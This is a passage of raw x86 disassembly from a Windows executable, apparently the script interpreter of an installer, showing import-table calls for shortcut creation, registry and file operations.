  401dae:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  401db1:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401db5:	50                   	push   %eax
  401db6:	8b 45 b0             	mov    -0x50(%ebp),%eax
  401db9:	0f af 45 f8          	imul   -0x8(%ebp),%eax
  401dbd:	f7 de                	neg    %esi
  401dbf:	50                   	push   %eax
  401dc0:	57                   	push   %edi
  401dc1:	ff 75 f4             	push   -0xc(%ebp)
  401dc4:	1b f6                	sbb    %esi,%esi
  401dc6:	23 35 20 47 42 00    	and    0x424720,%esi
  401dcc:	56                   	push   %esi
  401dcd:	ff 15 34 82 40 00    	call   *0x408234
  401dd3:	50                   	push   %eax
  401dd4:	57                   	push   %edi
  401dd5:	68 72 01 00 00       	push   $0x172
  401dda:	ff 75 08             	push   0x8(%ebp)
  401ddd:	ff 15 00 82 40 00    	call   *0x408200
  401de3:	3b c3                	cmp    %ebx,%eax
  401de5:	0f 84 cd 0b 00 00    	je     0x4029b8
  401deb:	3b fb                	cmp    %ebx,%edi
  401ded:	0f 85 c5 0b 00 00    	jne    0x4029b8
  401df3:	50                   	push   %eax
  401df4:	ff 15 60 80 40 00    	call   *0x408060
  401dfa:	e9 b9 0b 00 00       	jmp    0x4029b8
  401dff:	ff 75 f8             	push   -0x8(%ebp)
  401e02:	ff 15 f0 81 40 00    	call   *0x4081f0
  401e08:	6a 02                	push   $0x2
  401e0a:	8b f8                	mov    %eax,%edi
  401e0c:	e8 f9 0c 00 00       	call   0x402b0a
  401e11:	59                   	pop    %ecx
  401e12:	8b d8                	mov    %eax,%ebx
  401e14:	6a 48                	push   $0x48
  401e16:	6a 5a                	push   $0x5a
  401e18:	57                   	push   %edi
  401e19:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401e1c:	ff 15 64 80 40 00    	call   *0x408064
  401e22:	50                   	push   %eax
  401e23:	53                   	push   %ebx
  401e24:	ff 15 44 81 40 00    	call   *0x408144
  401e2a:	57                   	push   %edi
  401e2b:	ff 75 f8             	push   -0x8(%ebp)
  401e2e:	f7 d8                	neg    %eax
  401e30:	a3 00 b8 40 00       	mov    %eax,0x40b800
  401e35:	ff 15 f4 81 40 00    	call   *0x4081f4
  401e3b:	6a 03                	push   $0x3
  401e3d:	e8 c8 0c 00 00       	call   0x402b0a
  401e42:	a3 10 b8 40 00       	mov    %eax,0x40b810
  401e47:	8a 45 dc             	mov    -0x24(%ebp),%al
  401e4a:	59                   	pop    %ecx
  401e4b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401e4e:	ff 75 d0             	push   -0x30(%ebp)
  401e51:	8a c8                	mov    %al,%cl
  401e53:	80 e1 01             	and    $0x1,%cl
  401e56:	c6 05 17 b8 40 00 01 	movb   $0x1,0x40b817
  401e5d:	88 0d 14 b8 40 00    	mov    %cl,0x40b814
  401e63:	8a c8                	mov    %al,%cl
  401e65:	80 e1 02             	and    $0x2,%cl
  401e68:	24 04                	and    $0x4,%al
  401e6a:	68 1c b8 40 00       	push   $0x40b81c
  401e6f:	88 0d 15 b8 40 00    	mov    %cl,0x40b815
  401e75:	a2 16 b8 40 00       	mov    %al,0x40b816
  401e7a:	e8 e4 42 00 00       	call   0x406163
  401e7f:	68 00 b8 40 00       	push   $0x40b800
  401e84:	ff 15 58 80 40 00    	call   *0x408058
  401e8a:	e9 55 07 00 00       	jmp    0x4025e4
  401e8f:	53                   	push   %ebx
  401e90:	e8 75 0c 00 00       	call   0x402b0a
  401e95:	6a 01                	push   $0x1
  401e97:	8b f0                	mov    %eax,%esi
  401e99:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401e9c:	e8 69 0c 00 00       	call   0x402b0a
  401ea1:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401ea4:	59                   	pop    %ecx
  401ea5:	59                   	pop    %ecx
  401ea6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ea9:	50                   	push   %eax
  401eaa:	56                   	push   %esi
  401eab:	75 0b                	jne    0x401eb8
  401ead:	ff 15 48 82 40 00    	call   *0x408248
  401eb3:	e9 00 0b 00 00       	jmp    0x4029b8
  401eb8:	ff 15 f8 81 40 00    	call   *0x4081f8
  401ebe:	e9 f5 0a 00 00       	jmp    0x4029b8
  401ec3:	53                   	push   %ebx
  401ec4:	e8 63 0c 00 00       	call   0x402b2c
  401ec9:	6a 31                	push   $0x31
  401ecb:	8b f0                	mov    %eax,%esi
  401ecd:	e8 5a 0c 00 00       	call   0x402b2c
  401ed2:	6a 22                	push   $0x22
  401ed4:	8b d8                	mov    %eax,%ebx
  401ed6:	e8 51 0c 00 00       	call   0x402b2c
  401edb:	6a 15                	push   $0x15
  401edd:	8b f8                	mov    %eax,%edi
  401edf:	e8 48 0c 00 00       	call   0x402b2c
  401ee4:	6a ec                	push   $0xffffffec
  401ee6:	e8 38 f5 ff ff       	call   0x401423
  401eeb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401eee:	89 45 80             	mov    %eax,-0x80(%ebp)
  401ef1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401ef4:	89 45 84             	mov    %eax,-0x7c(%ebp)
  401ef7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401efa:	89 45 98             	mov    %eax,-0x68(%ebp)
  401efd:	8a 06                	mov    (%esi),%al
  401eff:	f6 d8                	neg    %al
  401f01:	1b c0                	sbb    %eax,%eax
  401f03:	89 5d 8c             	mov    %ebx,-0x74(%ebp)
  401f06:	23 c6                	and    %esi,%eax
  401f08:	89 45 88             	mov    %eax,-0x78(%ebp)
  401f0b:	8a 07                	mov    (%edi),%al
  401f0d:	f6 d8                	neg    %al
  401f0f:	1b c0                	sbb    %eax,%eax
  401f11:	c7 45 94 00 a8 42 00 	movl   $0x42a800,-0x6c(%ebp)
  401f18:	23 c7                	and    %edi,%eax
  401f1a:	89 45 90             	mov    %eax,-0x70(%ebp)
  401f1d:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  401f23:	50                   	push   %eax
  401f24:	e8 fa 38 00 00       	call   0x405823
  401f29:	85 c0                	test   %eax,%eax
  401f2b:	0f 84 52 08 00 00    	je     0x402783
  401f31:	f6 45 80 40          	testb  $0x40,-0x80(%ebp)
  401f35:	0f 84 7d 0a 00 00    	je     0x4029b8
  401f3b:	ff 75 b4             	push   -0x4c(%ebp)
  401f3e:	e8 0b 46 00 00       	call   0x40654e
  401f43:	ff 75 b4             	push   -0x4c(%ebp)
  401f46:	eb 45                	jmp    0x401f8d
  401f48:	53                   	push   %ebx
  401f49:	e8 de 0b 00 00       	call   0x402b2c
  401f4e:	8b f0                	mov    %eax,%esi
  401f50:	56                   	push   %esi
  401f51:	6a eb                	push   $0xffffffeb
  401f53:	e8 10 33 00 00       	call   0x405268
  401f58:	56                   	push   %esi
  401f59:	e8 82 38 00 00       	call   0x4057e0
  401f5e:	8b f0                	mov    %eax,%esi
  401f60:	3b f3                	cmp    %ebx,%esi
  401f62:	0f 84 1b 08 00 00    	je     0x402783
  401f68:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401f6b:	74 1f                	je     0x401f8c
  401f6d:	56                   	push   %esi
  401f6e:	e8 db 45 00 00       	call   0x40654e
  401f73:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401f76:	7c 09                	jl     0x401f81
  401f78:	50                   	push   %eax
  401f79:	57                   	push   %edi
  401f7a:	e8 20 41 00 00       	call   0x40609f
  401f7f:	eb 0b                	jmp    0x401f8c
  401f81:	3b c3                	cmp    %ebx,%eax
  401f83:	74 07                	je     0x401f8c
  401f85:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401f8c:	56                   	push   %esi
  401f8d:	ff 15 14 81 40 00    	call   *0x408114
  401f93:	e9 20 0a 00 00       	jmp    0x4029b8
  401f98:	6a 02                	push   $0x2
  401f9a:	e8 8d 0b 00 00       	call   0x402b2c
  401f9f:	50                   	push   %eax
  401fa0:	e8 9f 44 00 00       	call   0x406444
  401fa5:	3b c3                	cmp    %ebx,%eax
  401fa7:	89 45 08             	mov    %eax,0x8(%ebp)
  401faa:	74 13                	je     0x401fbf
  401fac:	8b d8                	mov    %eax,%ebx
  401fae:	ff 73 14             	push   0x14(%ebx)
  401fb1:	57                   	push   %edi
  401fb2:	e8 e8 40 00 00       	call   0x40609f
  401fb7:	ff 73 18             	push   0x18(%ebx)
  401fba:	e9 aa f5 ff ff       	jmp    0x401569
  401fbf:	88 1e                	mov    %bl,(%esi)
  401fc1:	88 1f                	mov    %bl,(%edi)
  401fc3:	e9 bb 07 00 00       	jmp    0x402783
  401fc8:	6a ee                	push   $0xffffffee
  401fca:	e8 5d 0b 00 00       	call   0x402b2c
  401fcf:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  401fd2:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401fd5:	51                   	push   %ecx
  401fd6:	50                   	push   %eax
  401fd7:	6a 09                	push   $0x9
  401fd9:	e8 fb 44 00 00       	call   0x4064d9
  401fde:	ff d0                	call   *%eax
  401fe0:	88 1e                	mov    %bl,(%esi)
  401fe2:	3b c3                	cmp    %ebx,%eax
  401fe4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401fe7:	88 1f                	mov    %bl,(%edi)
  401fe9:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401ff0:	0f 84 c2 09 00 00    	je     0x4029b8
  401ff6:	50                   	push   %eax
  401ff7:	6a 40                	push   $0x40
  401ff9:	ff 15 58 81 40 00    	call   *0x408158
  401fff:	3b c3                	cmp    %ebx,%eax
  402001:	89 45 08             	mov    %eax,0x8(%ebp)
  402004:	0f 84 ae 09 00 00    	je     0x4029b8
  40200a:	6a 0a                	push   $0xa
  40200c:	e8 c8 44 00 00       	call   0x4064d9
  402011:	6a 0b                	push   $0xb
  402013:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402016:	e8 be 44 00 00       	call   0x4064d9
  40201b:	ff 75 08             	push   0x8(%ebp)
  40201e:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402021:	ff 75 f4             	push   -0xc(%ebp)
  402024:	53                   	push   %ebx
  402025:	ff 75 e4             	push   -0x1c(%ebp)
  402028:	ff 55 c0             	call   *-0x40(%ebp)
  40202b:	85 c0                	test   %eax,%eax
  40202d:	74 32                	je     0x402061
  40202f:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  402032:	50                   	push   %eax
  402033:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402036:	50                   	push   %eax
  402037:	68 14 a0 40 00       	push   $0x40a014
  40203c:	ff 75 08             	push   0x8(%ebp)
  40203f:	ff 55 c4             	call   *-0x3c(%ebp)
  402042:	85 c0                	test   %eax,%eax
  402044:	74 1b                	je     0x402061
  402046:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402049:	ff 70 08             	push   0x8(%eax)
  40204c:	56                   	push   %esi
  40204d:	e8 4d 40 00 00       	call   0x40609f
  402052:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402055:	ff 70 0c             	push   0xc(%eax)
  402058:	57                   	push   %edi
  402059:	e8 41 40 00 00       	call   0x40609f
  40205e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402061:	ff 75 08             	push   0x8(%ebp)
  402064:	e9 69 fb ff ff       	jmp    0x401bd2
  402069:	39 1d f8 47 42 00    	cmp    %ebx,0x4247f8
  40206f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402076:	0f 8c b5 00 00 00    	jl     0x402131
  40207c:	6a f0                	push   $0xfffffff0
  40207e:	e8 a9 0a 00 00       	call   0x402b2c
  402083:	6a 01                	push   $0x1
  402085:	8b f0                	mov    %eax,%esi
  402087:	e8 a0 0a 00 00       	call   0x402b2c
  40208c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40208f:	89 45 08             	mov    %eax,0x8(%ebp)
  402092:	74 0d                	je     0x4020a1
  402094:	56                   	push   %esi
  402095:	ff 15 54 81 40 00    	call   *0x408154
  40209b:	8b f8                	mov    %eax,%edi
  40209d:	3b fb                	cmp    %ebx,%edi
  40209f:	75 10                	jne    0x4020b1
  4020a1:	6a 08                	push   $0x8
  4020a3:	53                   	push   %ebx
  4020a4:	56                   	push   %esi
  4020a5:	ff 15 50 81 40 00    	call   *0x408150
  4020ab:	8b f8                	mov    %eax,%edi
  4020ad:	3b fb                	cmp    %ebx,%edi
  4020af:	74 79                	je     0x40212a
  4020b1:	ff 75 08             	push   0x8(%ebp)
  4020b4:	57                   	push   %edi
  4020b5:	e8 8e 44 00 00       	call   0x406548
  4020ba:	8b f0                	mov    %eax,%esi
  4020bc:	3b f3                	cmp    %ebx,%esi
  4020be:	74 3d                	je     0x4020fd
  4020c0:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4020c3:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020c6:	74 17                	je     0x4020df
  4020c8:	ff 75 d4             	push   -0x2c(%ebp)
  4020cb:	e8 53 f3 ff ff       	call   0x401423
  4020d0:	ff d6                	call   *%esi
  4020d2:	85 c0                	test   %eax,%eax
  4020d4:	74 31                	je     0x402107
  4020d6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4020dd:	eb 28                	jmp    0x402107
  4020df:	68 00 a0 40 00       	push   $0x40a000
  4020e4:	68 40 b8 40 00       	push   $0x40b840
  4020e9:	68 00 50 42 00       	push   $0x425000
  4020ee:	68 00 04 00 00       	push   $0x400
  4020f3:	ff 75 f8             	push   -0x8(%ebp)
  4020f6:	ff d6                	call   *%esi
  4020f8:	83 c4 14             	add    $0x14,%esp
  4020fb:	eb 0a                	jmp    0x402107
  4020fd:	ff 75 08             	push   0x8(%ebp)
  402100:	6a f7                	push   $0xfffffff7
  402102:	e8 61 31 00 00       	call   0x405268
  402107:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  40210a:	0f 85 a8 08 00 00    	jne    0x4029b8
  402110:	57                   	push   %edi
  402111:	e8 e8 17 00 00       	call   0x4038fe
  402116:	85 c0                	test   %eax,%eax
  402118:	0f 84 9a 08 00 00    	je     0x4029b8
  40211e:	57                   	push   %edi
  40211f:	ff 15 4c 81 40 00    	call   *0x40814c
  402125:	e9 8e 08 00 00       	jmp    0x4029b8
  40212a:	6a f6                	push   $0xfffffff6
  40212c:	e9 73 01 00 00       	jmp    0x4022a4
  402131:	6a e7                	push   $0xffffffe7
  402133:	e9 6c 01 00 00       	jmp    0x4022a4
  402138:	6a f0                	push   $0xfffffff0
  40213a:	e8 ed 09 00 00       	call   0x402b2c
  40213f:	6a df                	push   $0xffffffdf
  402141:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402144:	e8 e3 09 00 00       	call   0x402b2c
  402149:	6a 02                	push   $0x2
  40214b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40214e:	e8 d9 09 00 00       	call   0x402b2c
  402153:	6a cd                	push   $0xffffffcd
  402155:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402158:	e8 cf 09 00 00       	call   0x402b2c
  40215d:	6a 45                	push   $0x45
  40215f:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402162:	e8 c5 09 00 00       	call   0x402b2c
  402167:	ff 75 f4             	push   -0xc(%ebp)
  40216a:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  40216d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402170:	8b c8                	mov    %eax,%ecx
  402172:	8b f8                	mov    %eax,%edi
  402174:	8b f0                	mov    %eax,%esi
  402176:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  40217c:	c1 f8 10             	sar    $0x10,%eax
  40217f:	c1 fe 0c             	sar    $0xc,%esi
  402182:	25 ff ff 00 00       	and    $0xffff,%eax
  402187:	89 8d 78 ff ff ff    	mov    %ecx,-0x88(%ebp)
  40218d:	81 e7 00 80 00 00    	and    $0x8000,%edi
  402193:	83 e6 07             	and    $0x7,%esi
  402196:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402199:	e8 a8 39 00 00       	call   0x405b46
  40219e:	85 c0                	test   %eax,%eax
  4021a0:	75 07                	jne    0x4021a9
  4021a2:	6a 21                	push   $0x21
  4021a4:	e8 83 09 00 00       	call   0x402b2c
  4021a9:	8d 45 08             	lea    0x8(%ebp),%eax
  4021ac:	50                   	push   %eax
  4021ad:	68 00 84 40 00       	push   $0x408400
  4021b2:	6a 01                	push   $0x1
  4021b4:	53                   	push   %ebx
  4021b5:	68 10 84 40 00       	push   $0x408410
  4021ba:	ff 15 8c 82 40 00    	call   *0x40828c
  4021c0:	3b c3                	cmp    %ebx,%eax
  4021c2:	0f 8c d3 00 00 00    	jl     0x40229b
  4021c8:	8b 45 08             	mov    0x8(%ebp),%eax
  4021cb:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  4021ce:	52                   	push   %edx
  4021cf:	68 20 84 40 00       	push   $0x408420
  4021d4:	8b 08                	mov    (%eax),%ecx
  4021d6:	50                   	push   %eax
  4021d7:	ff 11                	call   *(%ecx)
  4021d9:	3b c3                	cmp    %ebx,%eax
  4021db:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021de:	0f 8c a9 00 00 00    	jl     0x40228d
  4021e4:	8b 45 08             	mov    0x8(%ebp),%eax
  4021e7:	ff 75 f4             	push   -0xc(%ebp)
  4021ea:	8b 08                	mov    (%eax),%ecx
  4021ec:	50                   	push   %eax
  4021ed:	ff 51 50             	call   *0x50(%ecx)
  4021f0:	3b fb                	cmp    %ebx,%edi
  4021f2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021f5:	75 0e                	jne    0x402205
  4021f7:	8b 45 08             	mov    0x8(%ebp),%eax
  4021fa:	68 00 a8 42 00       	push   $0x42a800
  4021ff:	50                   	push   %eax
  402200:	8b 08                	mov    (%eax),%ecx
  402202:	ff 51 24             	call   *0x24(%ecx)
  402205:	3b f3                	cmp    %ebx,%esi
  402207:	74 0a                	je     0x402213
  402209:	8b 45 08             	mov    0x8(%ebp),%eax
  40220c:	56                   	push   %esi
  40220d:	50                   	push   %eax
  40220e:	8b 08                	mov    (%eax),%ecx
  402210:	ff 51 3c             	call   *0x3c(%ecx)
  402213:	8b 45 08             	mov    0x8(%ebp),%eax
  402216:	ff 75 c4             	push   -0x3c(%ebp)
  402219:	8b 08                	mov    (%eax),%ecx
  40221b:	50                   	push   %eax
  40221c:	ff 51 34             	call   *0x34(%ecx)
  40221f:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  402222:	38 19                	cmp    %bl,(%ecx)
  402224:	74 10                	je     0x402236
  402226:	8b 45 08             	mov    0x8(%ebp),%eax
  402229:	ff b5 78 ff ff ff    	push   -0x88(%ebp)
  40222f:	8b 10                	mov    (%eax),%edx
  402231:	51                   	push   %ecx
  402232:	50                   	push   %eax
  402233:	ff 52 44             	call   *0x44(%edx)
  402236:	8b 45 08             	mov    0x8(%ebp),%eax
  402239:	ff 75 bc             	push   -0x44(%ebp)
  40223c:	8b 08                	mov    (%eax),%ecx
  40223e:	50                   	push   %eax
  40223f:	ff 51 2c             	call   *0x2c(%ecx)
  402242:	8b 45 08             	mov    0x8(%ebp),%eax
  402245:	ff 75 b4             	push   -0x4c(%ebp)
  402248:	8b 08                	mov    (%eax),%ecx
  40224a:	50                   	push   %eax
  40224b:	ff 51 1c             	call   *0x1c(%ecx)
  40224e:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  402251:	7c 31                	jl     0x402284
  402253:	68 00 04 00 00       	push   $0x400
  402258:	c7 45 f8 05 40 00 80 	movl   $0x80004005,-0x8(%ebp)
  40225f:	ff 75 f4             	push   -0xc(%ebp)
  402262:	6a ff                	push   $0xffffffff
  402264:	ff 75 f0             	push   -0x10(%ebp)
  402267:	53                   	push   %ebx
  402268:	53                   	push   %ebx
  402269:	ff 15 48 81 40 00    	call   *0x408148
  40226f:	85 c0                	test   %eax,%eax
  402271:	74 11                	je     0x402284
  402273:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402276:	6a 01                	push   $0x1
  402278:	ff 75 f4             	push   -0xc(%ebp)
  40227b:	8b 08                	mov    (%eax),%ecx
  40227d:	50                   	push   %eax
  40227e:	ff 51 18             	call   *0x18(%ecx)
  402281:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402284:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402287:	50                   	push   %eax
  402288:	8b 08                	mov    (%eax),%ecx
  40228a:	ff 51 08             	call   *0x8(%ecx)
  40228d:	8b 45 08             	mov    0x8(%ebp),%eax
  402290:	50                   	push   %eax
  402291:	8b 08                	mov    (%eax),%ecx
  402293:	ff 51 08             	call   *0x8(%ecx)
  402296:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  402299:	7d 13                	jge    0x4022ae
  40229b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4022a2:	6a f0                	push   $0xfffffff0
  4022a4:	e8 7a f1 ff ff       	call   0x401423
  4022a9:	e9 0a 07 00 00       	jmp    0x4029b8
  4022ae:	6a f4                	push   $0xfffffff4
  4022b0:	eb f2                	jmp    0x4022a4
  4022b2:	53                   	push   %ebx
  4022b3:	e8 74 08 00 00       	call   0x402b2c
  4022b8:	6a 11                	push   $0x11
  4022ba:	8b f0                	mov    %eax,%esi
  4022bc:	e8 6b 08 00 00       	call   0x402b2c
  4022c1:	6a 23                	push   $0x23
  4022c3:	8b f8                	mov    %eax,%edi
  4022c5:	e8 62 08 00 00       	call   0x402b2c
  4022ca:	56                   	push   %esi
  4022cb:	89 45 08             	mov    %eax,0x8(%ebp)
  4022ce:	e8 71 41 00 00       	call   0x406444
  4022d3:	85 c0                	test   %eax,%eax
  4022d5:	75 0d                	jne    0x4022e4
  4022d7:	53                   	push   %ebx
  4022d8:	6a f9                	push   $0xfffffff9
  4022da:	e8 89 2f 00 00       	call   0x405268
  4022df:	e9 9f 04 00 00       	jmp    0x402783
  4022e4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4022e7:	56                   	push   %esi
  4022e8:	89 45 98             	mov    %eax,-0x68(%ebp)
  4022eb:	c7 45 9c 02 00 00 00 	movl   $0x2,-0x64(%ebp)
  4022f2:	e8 60 3e 00 00       	call   0x406157
  4022f7:	57                   	push   %edi
  4022f8:	88 5c 30 01          	mov    %bl,0x1(%eax,%esi,1)
  4022fc:	e8 56 3e 00 00       	call   0x406157
  402301:	88 5c 38 01          	mov    %bl,0x1(%eax,%edi,1)
  402305:	8b 45 08             	mov    0x8(%ebp),%eax
  402308:	66 8b 4d d4          	mov    -0x2c(%ebp),%cx
  40230c:	50                   	push   %eax
  40230d:	53                   	push   %ebx
  40230e:	89 75 a0             	mov    %esi,-0x60(%ebp)
  402311:	89 7d a4             	mov    %edi,-0x5c(%ebp)
  402314:	89 45 b2             	mov    %eax,-0x4e(%ebp)
  402317:	66 89 4d a8          	mov    %cx,-0x58(%ebp)
  40231b:	e8 48 2f 00 00       	call   0x405268
  402320:	8d 45 98             	lea    -0x68(%ebp),%eax
  402323:	50                   	push   %eax
  402324:	ff 15 7c 81 40 00    	call   *0x40817c
  40232a:	85 c0                	test   %eax,%eax
  40232c:	0f 84 86 06 00 00    	je     0x4029b8
  402332:	eb a3                	jmp    0x4022d7
  402334:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  402339:	74 1d                	je     0x402358
  40233b:	68 10 00 20 00       	push   $0x200010
  402340:	6a e8                	push   $0xffffffe8
  402342:	53                   	push   %ebx
  402343:	e8 1b 3e 00 00       	call   0x406163
  402348:	50                   	push   %eax
  402349:	e8 0f 35 00 00       	call   0x40585d
  40234e:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  402353:	e9 6b 06 00 00       	jmp    0x4029c3
  402358:	ff 05 d4 47 42 00    	incl   0x4247d4
  40235e:	e9 55 06 00 00       	jmp    0x4029b8
  402363:	33 f6                	xor    %esi,%esi
  402365:	33 ff                	xor    %edi,%edi
  402367:	3b c3                	cmp    %ebx,%eax
  402369:	74 0b                	je     0x402376
  40236b:	53                   	push   %ebx
  40236c:	e8 bb 07 00 00       	call   0x402b2c
  402371:	8b 55 d0             	mov    -0x30(%ebp),%edx
  402374:	8b f0                	mov    %eax,%esi
  402376:	3b d3                	cmp    %ebx,%edx
  402378:	74 09                	je     0x402383
  40237a:	6a 11                	push   $0x11
  40237c:	e8 ab 07 00 00       	call   0x402b2c
  402381:	8b f8                	mov    %eax,%edi
  402383:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402386:	74 09                	je     0x402391
  402388:	6a 22                	push   $0x22
  40238a:	e8 9d 07 00 00       	call   0x402b2c
  40238f:	8b d8                	mov    %eax,%ebx
  402391:	6a cd                	push   $0xffffffcd
  402393:	e8 94 07 00 00       	call   0x402b2c
  402398:	50                   	push   %eax
  402399:	53                   	push   %ebx
  40239a:	57                   	push   %edi
  40239b:	56                   	push   %esi
  40239c:	ff 15 40 81 40 00    	call   *0x408140
  4023a2:	e9 07 f2 ff ff       	jmp    0x4015ae
  4023a7:	66 a1 10 a0 40 00    	mov    0x40a010,%ax
  4023ad:	6a 01                	push   $0x1
  4023af:	66 89 45 0a          	mov    %ax,0xa(%ebp)
  4023b3:	e8 74 07 00 00       	call   0x402b2c
  4023b8:	6a 12                	push   $0x12
  4023ba:	8b f8                	mov    %eax,%edi
  4023bc:	e8 6b 07 00 00       	call   0x402b2c
  4023c1:	6a dd                	push   $0xffffffdd
  4023c3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4023c6:	e8 61 07 00 00       	call   0x402b2c
  4023cb:	50                   	push   %eax
  4023cc:	68 ff 03 00 00       	push   $0x3ff
  4023d1:	8d 45 0a             	lea    0xa(%ebp),%eax
  4023d4:	56                   	push   %esi
  4023d5:	50                   	push   %eax
  4023d6:	ff 75 f0             	push   -0x10(%ebp)
  4023d9:	57                   	push   %edi
  4023da:	ff 15 3c 81 40 00    	call   *0x40813c
  4023e0:	80 3e 0a             	cmpb   $0xa,(%esi)
  4023e3:	e9 53 f3 ff ff       	jmp    0x40173b
  4023e8:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4023eb:	8b f2                	mov    %edx,%esi
  4023ed:	75 2b                	jne    0x40241a
  4023ef:	6a 02                	push   $0x2
  4023f1:	e8 76 07 00 00       	call   0x402b6c
  4023f6:	8b f0                	mov    %eax,%esi
  4023f8:	3b f3                	cmp    %ebx,%esi
  4023fa:	0f 84 83 03 00 00    	je     0x402783
  402400:	6a 33                	push   $0x33
  402402:	e8 25 07 00 00       	call   0x402b2c
  402407:	50                   	push   %eax
  402408:	56                   	push   %esi
  402409:	ff 15 20 80 40 00    	call   *0x408020
  40240f:	56                   	push   %esi
  402410:	8b f8                	mov    %eax,%edi
  402412:	ff 15 24 80 40 00    	call   *0x408024
  402418:	eb 16                	jmp    0x402430
  40241a:	6a 22                	push   $0x22
  40241c:	e8 0b 07 00 00       	call   0x402b2c
  402421:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402424:	d1 f9                	sar    $1,%ecx
  402426:	51                   	push   %ecx
  402427:	50                   	push   %eax
  402428:	56                   	push   %esi
  402429:	e8 bc 07 00 00       	call   0x402bea
  40242e:	8b f8                	mov    %eax,%edi
  402430:	3b fb                	cmp    %ebx,%edi
  402432:	0f 84 80 05 00 00    	je     0x4029b8
  402438:	e9 46 03 00 00       	jmp    0x402783
  40243d:	8b 75 dc             	mov    -0x24(%ebp),%esi
  402440:	8b f8                	mov    %eax,%edi
  402442:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402445:	6a 02                	push   $0x2
  402447:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40244a:	e8 dd 06 00 00       	call   0x402b2c
  40244f:	6a 11                	push   $0x11
  402451:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402454:	e8 d3 06 00 00       	call   0x402b2c
  402459:	6a 02                	push   $0x2
  40245b:	50                   	push   %eax
  40245c:	57                   	push   %edi
  40245d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402464:	e8 53 07 00 00       	call   0x402bbc
  402469:	3b c3                	cmp    %ebx,%eax
  40246b:	89 45 08             	mov    %eax,0x8(%ebp)
  40246e:	0f 84 44 05 00 00    	je     0x4029b8
  402474:	33 c0                	xor    %eax,%eax
  402476:	83 fe 01             	cmp    $0x1,%esi
  402479:	bf 00 ac 40 00       	mov    $0x40ac00,%edi
  40247e:	75 0e                	jne    0x40248e
  402480:	6a 23                	push   $0x23
  402482:	e8 a5 06 00 00       	call   0x402b2c
  402487:	57                   	push   %edi
  402488:	e8 ca 3c 00 00       	call   0x406157
  40248d:	40                   	inc    %eax
  40248e:	83 fe 04             	cmp    $0x4,%esi
  402491:	75 12                	jne    0x4024a5
  402493:	6a 03                	push   $0x3
  402495:	e8 70 06 00 00       	call   0x402b0a
  40249a:	59                   	pop    %ecx
  40249b:	a3 00 ac 40 00       	mov    %eax,0x40ac00
  4024a0:	56                   	push   %esi
  4024a1:	89 55 bc             	mov    %edx,-0x44(%ebp)
  4024a4:	58                   	pop    %eax
  4024a5:	83 fe 03             	cmp    $0x3,%esi
  4024a8:	75 0f                	jne    0x4024b9
  4024aa:	68 00 0c 00 00       	push   $0xc00
  4024af:	57                   	push   %edi
  4024b0:	53                   	push   %ebx
  4024b1:	ff 75 d8             	push   -0x28(%ebp)
  4024b4:	e8 fc 0b 00 00       	call   0x4030b5
  4024b9:	50                   	push   %eax
  4024ba:	57                   	push   %edi
  4024bb:	ff 75 f0             	push   -0x10(%ebp)
  4024be:	53                   	push   %ebx
  4024bf:	ff 75 b4             	push   -0x4c(%ebp)
  4024c2:	ff 75 08             	push   0x8(%ebp)
